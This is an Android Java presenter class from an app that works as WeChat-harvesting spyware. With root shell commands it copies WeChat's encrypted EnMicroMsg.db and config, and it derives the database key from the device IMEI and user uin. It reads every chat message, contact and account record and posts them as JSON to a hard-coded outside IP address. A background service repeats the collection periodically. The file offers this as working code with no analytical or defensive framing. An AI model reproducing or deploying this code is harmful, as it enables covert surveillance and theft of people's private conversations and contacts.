package cn.truistic.enmicromsg.main.presenter;

import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Handler;
import android.util.Log;

import net.sqlcipher.Cursor;
import net.sqlcipher.database.SQLiteDatabase;
import net.sqlcipher.database.SQLiteDatabaseHook;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import cn.truistic.enmicromsg.common.service.WhiteService;
import cn.truistic.enmicromsg.common.util.DeviceUtil;
import cn.truistic.enmicromsg.common.util.JsonUtil;
import cn.truistic.enmicromsg.common.util.MD5Util;
import cn.truistic.enmicromsg.common.util.RootUtil;
import cn.truistic.enmicromsg.common.util.SharedPerfUtil;
import cn.truistic.enmicromsg.info.ContentInfo;
import cn.truistic.enmicromsg.info.MessageInfo;
import cn.truistic.enmicromsg.info.UserInfo;
import cn.truistic.enmicromsg.main.MainMVP;
import cn.truistic.enmicromsg.main.model.HomeModel;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

import static cn.truistic.enmicromsg.common.util.DeviceUtil.formatTime;

/**
 * HomePresenter
 */
public class HomePresenter implements MainMVP.IHomePresenter {

    private byte[] mLvbuffer,mLvbuff;
    private int msgId,mVaid;

    private static final String urlPath = "http://113.105.55.205:8090/UpData/ReceiveWeChat.aspx";

    private String  mContent,mCreateTime,mTalker,
            mIsSend,mUserName,mAlias,mNickName,mMsgSvrId,mType,mStatus,mIsShowTimer,mReserved,mImgPath,mTransContent
            ,mTransBrandWording,mTalkerId,mBizClientMsgId,mBizChatUserId,mMsgSeq,mFlag,mBizChaId, mVatype,mValue,
            mConRemark,mDomainList,mPyInitial,mQuanPin,mShowHead,mCttype,mWeiboFlag,mWeiboNickname,
            mConRemarkPYFull,mConRemarkPYShort,mVerifyFlag,mEncryptUsername,mChatroomFlag,mDeleteFlag,
            mContactLabelIds,mJsonContent,mJsonMessage,mJsonUser;
    private MessageInfo mMessageInfo ;
    private UserInfo mUserInfo;
    private ContentInfo mContentInfo;

    List<MessageInfo> mMessageInfos = new ArrayList<>();
    List<UserInfo> mUserInfos= new ArrayList<>();
    List<ContentInfo> mContentInfos = new ArrayList<>();

    private Context context;
    private MainMVP.IHomeView homeView;
    private MainMVP.IHomeModel homeModel;
    private String mSelection;
    private String mTime;



    public HomePresenter(Context context, MainMVP.IHomeView homeView) {
        this.context = context;
        this.homeView = homeView;
        homeModel = new HomeModel(this, context);
    }

    @Override
    public void detect() {
        new DetectTask().execute();
    }

    /**
     * 检测操作
     */
    private class DetectTask extends AsyncTask {
        @Override
        protected Object doInBackground(Object[] params) {
            boolean flag = true;
            while (flag) {
                // 1.检测微信是否已经安装
                publishProgress(MainMVP.IHomeView.Progress.DETECT_WECHAT, MainMVP.IHomeView.State.DETECTING);
                if (!detectWechat()) {
                    publishProgress(MainMVP.IHomeView.Progress.DETECT_WECHAT, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_WECHAT, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.DETECT_WECHAT, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_WECHAT, MainMVP.IHomeView.State.TRUE);
                // 2.检测设备是否已Root
                publishProgress(MainMVP.IHomeView.Progress.DETECT_ROOT, MainMVP.IHomeView.State.DETECTING);
                if (!detectRoot()) {
                    publishProgress(MainMVP.IHomeView.Progress.DETECT_ROOT, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_ROOT, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.DETECT_ROOT, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_ROOT, MainMVP.IHomeView.State.TRUE);

                // *****************开启后台服务********每隔多少分钟执行一次****************************
                publishProgress(MainMVP.IHomeView.Progress.DETECT_SERVICE, MainMVP.IHomeView.State.DETECTING);
                if (!detectService()) {
                    publishProgress(MainMVP.IHomeView.Progress.DETECT_SERVICE, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_SERVICE, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.DETECT_SERVICE, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_SERVICE, MainMVP.IHomeView.State.TRUE);
                flag = false;


                // 3.检测是否已授权应用Root权限
                publishProgress(MainMVP.IHomeView.Progress.DETECT_PERMISSION, MainMVP.IHomeView.State.DETECTING);
                if (!detectPermission()) {
                    publishProgress(MainMVP.IHomeView.Progress.DETECT_PERMISSION, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_PERMISSION, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.DETECT_PERMISSION, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_PERMISSION, MainMVP.IHomeView.State.TRUE);


                // 4.获取微信相关数据
                publishProgress(MainMVP.IHomeView.Progress.REQUEST_DATA, MainMVP.IHomeView.State.DETECTING);
                if (!requestData()) {
                    publishProgress(MainMVP.IHomeView.Progress.REQUEST_DATA, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.REQUEST_DATA, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.REQUEST_DATA, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.REQUEST_DATA, MainMVP.IHomeView.State.TRUE);

                // 5.解析微信相关数据******************聊天记录************************************
                publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_DATA, MainMVP.IHomeView.State.DETECTING);
                if (!analysisData()) {
                    publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_DATA, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.ANALYSIS_DATA, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_DATA, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.ANALYSIS_DATA, MainMVP.IHomeView.State.TRUE);
                flag = false;

                // 5.解析微信相关数据******************联系人************************************
                publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_CONNTENT, MainMVP.IHomeView.State.DETECTING);
                if (!analysisContent()) {
                    publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_CONNTENT, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.ANALYSIS_CONNTENT, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_CONNTENT, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.ANALYSIS_CONNTENT, MainMVP.IHomeView.State.TRUE);
                flag = false;

                // 5.解析微信相关数据******************微信号************************************
                publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_USER, MainMVP.IHomeView.State.DETECTING);
                if (!analysisUser()) {
                    publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_USER, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.ANALYSIS_USER, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_USER, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.ANALYSIS_USER, MainMVP.IHomeView.State.TRUE);
                flag = false;


                // 6.解析微信相关数据******************上传数据************************************
                publishProgress(MainMVP.IHomeView.Progress.UPLOAD_DATA, MainMVP.IHomeView.State.DETECTING);
                if (!uploadData()) {
                    publishProgress(MainMVP.IHomeView.Progress.UPLOAD_DATA, MainMVP.IHomeView.State.FALSE);
                    homeModel.saveState(MainMVP.IHomeView.Progress.UPLOAD_DATA, MainMVP.IHomeView.State.FALSE);
                    break;
                }
                publishProgress(MainMVP.IHomeView.Progress.UPLOAD_DATA, MainMVP.IHomeView.State.TRUE);
                homeModel.saveState(MainMVP.IHomeView.Progress.UPLOAD_DATA, MainMVP.IHomeView.State.TRUE);
                flag = false;


            }


            return null;
        }

        @Override
        protected void onProgressUpdate(Object[] values) {
            homeView.setProgressState((MainMVP.IHomeView.Progress) values[0], (MainMVP.IHomeView.State) values[1]);
        }

        @Override
        protected void onPostExecute(Object o) {
            homeView.onDetectStop();
        }
    }
    /**
     * 检测数据是否上传
     *
     * @return true，已上传
     */
    private boolean uploadData() {

        mJsonMessage = JsonUtil.toJson(mMessageInfos);
        mJsonContent = JsonUtil.toJson(mContentInfos);
        mJsonUser = JsonUtil.toJson(mUserInfos);

        postJson(mJsonMessage);
        postJson(mJsonContent);
        postJson(mJsonUser);

        return true;
    }

    private void postJson(String s) {
        MediaType JSON = MediaType.parse("application/json; charset=utf-8");
        OkHttpClient client = new OkHttpClient();//创建okhttp实例
        RequestBody body=RequestBody.create(JSON,s);
        Request request = new Request.Builder()
                .url(urlPath)
                .post(body)
                .build();
        okhttp3.Call call = client.newCall(request);
        call.enqueue(new Callback() {
            @Override
            public void onFailure(okhttp3.Call call, IOException e) {
                Log.i("DDDBBB----Presenter", "onFailure: " + e);
            }

            @Override
            public void onResponse(okhttp3.Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    Log.i("DDDBBB----Presenter", "onResponse: " + response.body().string());
                }
            }

        });
    }

    /**
     * 检测微信是否已经安装
     *
     * @return true，微信已安装
     */
    private boolean detectWechat() {
        return DeviceUtil.isAppInstalled(context, "com.tencent.mm");
    }

    /**
     * 检测设备是否开启后台服务
     *
     * @return true, 设备已开启
     */
    private boolean detectService() {
        Handler handler = new Handler(context.getMainLooper());
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                Intent whiteIntent = new Intent(context, WhiteService.class);
                context.startService(whiteIntent);
            }
        },1000 * 30);  //30秒
        return true;
    }

    /**
     * 检测设备是否已Root
     *
     * @return true, 设备已root
     */
    private boolean detectRoot() {
        return RootUtil.isDeviceRooted();
    }
    /**
     * 检测是否已授权应用Root权限
     *
     * @return true, 已授权
     */
    private boolean detectPermission() {
        return RootUtil.isGrantRootPermission();
    }



    /**
     * 获取微信数据
     *
     * @return true, 获取成功
     */
    private boolean requestData() {
        // 1.获取配置文件，用于获取uin
        String sharedPerfsPath = "/data/data/cn.truistic.enmicromsg/shared_prefs/system_config_prefs.xml";
        RootUtil.execCmds(new String[]{"cp /data/data/com.tencent.mm/shared_prefs/system_config_prefs.xml "
                + sharedPerfsPath, "chmod 777 " + sharedPerfsPath});
        File sharedPerfsFile = new File(sharedPerfsPath);
        if (!sharedPerfsFile.exists()) {
            return false;
        }
        // 2.获取数据库文件
        ArrayList<String> list = new ArrayList<>();
        list = RootUtil.execCmdsforResult(new String[]{"cd /data/data/com.tencent.mm/MicroMsg", "ls -R"});
        ArrayList<String> dirs = new ArrayList<>();
        String dir = null;
        String item = null;
        for (int i = 0; i < list.size(); i++) {
            item = list.get(i);
            if (item.startsWith("./") && item.length() == 35) {
                dir = item;
            } else if (item.equals("EnMicroMsg.db")) {
                dirs.add(dir.substring(2, 34));
            }
        }
        if (dirs.size() == 0) {
            return false;
        } else {
            for (int i = 0; i < dirs.size(); i++) {
                RootUtil.execCmds(new String[]{"cp /data/data/com.tencent.mm/MicroMsg/" + dirs.get(i)
                        + "/EnMicroMsg.db " + context.getFilesDir() + "/EnMicroMsg" + i + ".db",
                        "chmod 777 " + context.getFilesDir() + "/EnMicroMsg" + i + ".db"});
            }
        }
        File dbFile;
        int i, j = 0;
        for (i = 0; i < dirs.size(); i++) {
            dbFile = new File(context.getFilesDir() + "/EnMicroMsg" + i + ".db");
            if (!dbFile.exists()) {
                break;
            }
            j++;
        }
        if (j == 0)
            return false;
        homeModel.saveDbNum(j);
        return true;
    }


    /**
     * 解析微信相关数据---------------------------------聊天記錄-----------------------------------------------
     *
     * @return
     */
    private boolean analysisData() {
        // 1.计算数据库密码
        String uinStr = String.valueOf(SharedPerfUtil.getUin(context));
        String imei = DeviceUtil.getDeviceId(context);
        String dbPwd = MD5Util.md5(imei + uinStr).substring(0, 7);
        if (dbPwd == null)
            return false;
        homeModel.saveDbPwd(dbPwd);

        // 打开数据库
        SQLiteDatabaseHook hook = new SQLiteDatabaseHook() {
            public void preKey(SQLiteDatabase database) {
            }

            public void postKey(SQLiteDatabase database) {
                database.rawExecSQL("PRAGMA cipher_migrate;");  //最关键的一句！！！
            }
        };

        int num = homeModel.getDbNum();

        int j = 0;
        File dbFile;
        SQLiteDatabase database = null;
        for (int i = 0; i < num; i++) {
            dbFile = new File(context.getFilesDir() + "/EnMicroMsg" + i + ".db");
            mTime = (String) SharedPerfUtil.getParam(context,"last_time_wechat","0");
            mSelection = "createTime > ?";
            try {
                database = SQLiteDatabase.openOrCreateDatabase(dbFile, dbPwd, null, hook);
                break;
            } catch (Exception e) {
                j++;
            }
        }
        if (j == num) {
            return false;
        }

        try {

            //*********************************查询消息记录****************************************
            Cursor c = database.query("message", null,mSelection,new String[]{mTime}, null, null,
                    null);
            while (c.moveToNext()) {

                //消息ID
                msgId = c.getInt(c.getColumnIndex("msgId"));
                //发送还是接收
                mIsSend = c.getString(c.getColumnIndex("isSend"));
                //消息时间
                mCreateTime = c.getString(c.getColumnIndex("createTime"));
                //记号 ,名称和username一样
                mTalker = c.getString(c.getColumnIndex("talker"));
                //聊天信息
                mContent = c.getString(c.getColumnIndex("content"));
                mMsgSvrId = c.getString(c.getColumnIndex("msgSvrId"));
                mType = c.getString(c.getColumnIndex("type"));
                mStatus = c.getString(c.getColumnIndex("status"));
                mIsShowTimer = c.getString(c.getColumnIndex("isShowTimer"));
                mReserved = c.getString(c.getColumnIndex("reserved"));
                mImgPath = c.getString(c.getColumnIndex("imgPath"));
                mTransContent = c.getString(c.getColumnIndex("transContent"));
                mTransBrandWording = c.getString(c.getColumnIndex("transBrandWording"));
                mTalkerId = c.getString(c.getColumnIndex("talkerId"));
                mBizClientMsgId = c.getString(c.getColumnIndex("bizClientMsgId"));
                mBizChatUserId = c.getString(c.getColumnIndex("bizChatUserId"));
                mMsgSeq = c.getString(c.getColumnIndex("msgSeq"));
                mFlag = c.getString(c.getColumnIndex("flag"));
                mBizChaId = c.getString(c.getColumnIndex("bizChatId"));
                mLvbuffer = c.getBlob(c.getColumnIndex("lvbuffer"));

                if (mIsSend.equals("1")){
                    mIsSend="发送";
                }else if (mIsSend.equals("0")){
                    mIsSend="接收";
                }

                mMessageInfo = new MessageInfo(msgId,mMsgSvrId,mType,mStatus,mIsSend,mIsShowTimer,
                        formatTime(mCreateTime),mTalker,mContent,mImgPath,mReserved,mLvbuffer,mTransContent,
                        mTransBrandWording,mTalkerId,mBizClientMsgId,mBizChaId,mBizChatUserId,
                        mMsgSeq,mFlag);

                mMessageInfos.add(mMessageInfo);


                Log.i("DDDBBB---Presenter", mMessageInfo.toString());
            }
            c.close();
            database.close();
            SharedPerfUtil.setParam(context,"last_time_wechat",mCreateTime);
        } catch (Exception e) {
            if (mMessageInfos.isEmpty() || mMessageInfos ==null || mMessageInfos.size()
                    ==0){
                Log.i("DDDBBB---Presenter", "聊天记录没有新数据");
            }
        }
        return true;
    }

    /**
     * 解析微信相关数据*********************************查询联系人****************************************
     *
     * @return
     */
    private boolean analysisContent() {
        // 1.计算数据库密码
        String uinStr = String.valueOf(SharedPerfUtil.getUin(context));
        String imei = DeviceUtil.getDeviceId(context);
        String dbPwd = MD5Util.md5(imei + uinStr).substring(0, 7);
        if (dbPwd == null)
            return false;
        homeModel.saveDbPwd(dbPwd);

        // 打开数据库
        SQLiteDatabaseHook hook = new SQLiteDatabaseHook() {
            public void preKey(SQLiteDatabase database) {
            }

            public void postKey(SQLiteDatabase database) {
                database.rawExecSQL("PRAGMA cipher_migrate;");  //最关键的一句！！！
            }
        };

        int num = homeModel.getDbNum();

        int j = 0;
        File dbFile;
        SQLiteDatabase database = null;
        for (int i = 0; i < num; i++) {
            dbFile = new File(context.getFilesDir() + "/EnMicroMsg" + i + ".db");
            try {
                database = SQLiteDatabase.openOrCreateDatabase(dbFile, dbPwd, null, hook);
                break;
            } catch (Exception e) {
                j++;
            }
        }
        if (j == num) {
            return false;
        }

        try {

            //*********************************查询联系人****************************************
            //查询所有联系人（verifyFlag!=0:公众号等类型，群里面非好友的类型为4，未知类型2）
            Cursor c1 = database.query("rcontact", null, null, null, null, null, null);
            while (c1.moveToNext()) {

                //标记 和talker一样
                mUserName = c1.getString(c1.getColumnIndex("username"));
                //用户的微信号
                mAlias = c1.getString(c1.getColumnIndex("alias"));
                //昵称
                mNickName = c1.getString(c1.getColumnIndex("nickname"));
                mConRemark = c1.getString(c1.getColumnIndex("conRemark"));
                mDomainList = c1.getString(c1.getColumnIndex("domainList"));
                mPyInitial = c1.getString(c1.getColumnIndex("pyInitial"));
                mQuanPin = c1.getString(c1.getColumnIndex("quanPin"));
                mShowHead = c1.getString(c1.getColumnIndex("showHead"));
                mCttype = c1.getString(c1.getColumnIndex("type"));
                mWeiboFlag = c1.getString(c1.getColumnIndex("weiboFlag"));
                mWeiboNickname = c1.getString(c1.getColumnIndex("weiboNickname"));
                mConRemarkPYFull = c1.getString(c1.getColumnIndex("conRemarkPYFull"));
                mConRemarkPYShort = c1.getString(c1.getColumnIndex("conRemarkPYShort"));
                mVerifyFlag = c1.getString(c1.getColumnIndex("verifyFlag"));
                mEncryptUsername = c1.getString(c1.getColumnIndex("encryptUsername"));
                mChatroomFlag = c1.getString(c1.getColumnIndex("chatroomFlag"));
                mDeleteFlag = c1.getString(c1.getColumnIndex("deleteFlag"));
                mContactLabelIds = c1.getString(c1.getColumnIndex("contactLabelIds"));
                mLvbuff = c1.getBlob(c1.getColumnIndex("lvbuff"));

                mContentInfo = new ContentInfo(mUserName,mAlias,mConRemark,mDomainList,mNickName,
                        mPyInitial,mQuanPin,mShowHead,mCttype,mWeiboFlag,mWeiboNickname,
                        mConRemarkPYFull,mConRemarkPYShort,mLvbuff,mVerifyFlag,mEncryptUsername,
                        mChatroomFlag,mDeleteFlag,mContactLabelIds);

                mContentInfos.add(mContentInfo);

                Log.i("DDDBBB---Presenter", mContentInfo.toString());
            }
            c1.close();
            database.close();
        } catch (Exception e) {
            Log.d("DDDBBB---Presenter", "Exception");
        }
        return true;
    }


    /**
     * 解析微信相关数据*********************************查询微信号****************************************
     *
     * @return
     */
    private boolean analysisUser() {
        // 1.计算数据库密码
        String uinStr = String.valueOf(SharedPerfUtil.getUin(context));
        String imei = DeviceUtil.getDeviceId(context);
        String dbPwd = MD5Util.md5(imei + uinStr).substring(0, 7);
        if (dbPwd == null)
            return false;
        homeModel.saveDbPwd(dbPwd);

        // 打开数据库
        SQLiteDatabaseHook hook = new SQLiteDatabaseHook() {
            public void preKey(SQLiteDatabase database) {
            }

            public void postKey(SQLiteDatabase database) {
                database.rawExecSQL("PRAGMA cipher_migrate;");  //最关键的一句！！！
            }
        };

        int num = homeModel.getDbNum();

        int j = 0;
        File dbFile;
        SQLiteDatabase database = null;
        for (int i = 0; i < num; i++) {
            dbFile = new File(context.getFilesDir() + "/EnMicroMsg" + i + ".db");
            try {
                database = SQLiteDatabase.openOrCreateDatabase(dbFile, dbPwd, null, hook);
                break;
            } catch (Exception e) {
                j++;
            }
        }
        if (j == num) {
            return false;
        }

        try {

            //*********************************查询微信号****************************************

            Cursor c1 = database.query("userinfo", null, null, null, null, null, null);
            while (c1.moveToNext()) {

                mVaid = c1.getInt(c1.getColumnIndex("id"));
                mVatype = c1.getString(c1.getColumnIndex("type"));
                mValue = c1.getString(c1.getColumnIndex("value"));

                mUserInfo = new UserInfo(mVaid,mVatype,mValue);
                mUserInfos.add(mUserInfo);


                Log.i("DDDBBB", mUserInfo.toString());
            }
            c1.close();
            database.close();
        } catch (Exception e) {
            Log.d("DDDBBB---Presenter", "Exception");
        }
        return true;
    }

}